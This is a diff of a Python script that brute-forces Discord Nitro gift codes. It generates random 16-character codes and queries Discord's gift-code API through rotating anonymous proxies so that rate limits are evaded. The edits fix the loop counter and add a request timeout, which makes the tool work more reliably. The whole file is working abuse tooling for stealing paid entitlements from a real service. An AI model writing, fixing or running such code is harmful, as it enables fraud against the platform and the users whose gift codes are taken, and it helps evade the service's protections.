@@ -12,7 +12,7 @@ def main():
     
     num_proxy = int(input("Enter number of proxy to use (Default: 50) > "))
     amount    = int(input("Enter the amount of nitro to generate (Default: 1000) > "))
-    value = 0
+    value = 1
 
     if num_proxy == "":
         num_proxy = 50
@@ -24,7 +24,7 @@ def main():
     # generate proxy
 
     proxy_list = Prawler.get_proxy_list(num_proxy, 'http', 'elite', 'US')
-    print(proxy_list)
+
 
     while value <= amount:
 
@@ -36,7 +36,7 @@ def main():
         
         nitro = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(16)])
         print(f"trying -> {nitro} with proxy -> {_proxy}\n")
-        r = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}', proxies=proxies)
+        r = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}', proxies=proxies, timeout=3)
 
         if r.status_code == 200:
             print(f"wow, -> {nitro} is accepted.")
@@ -50,6 +50,7 @@ def main():
         elif r.status_code == 429:
             print('too many request. proxy -> rate limit?\n')
 
+        value += 1
 
 if __name__ == "__main__":
     main()
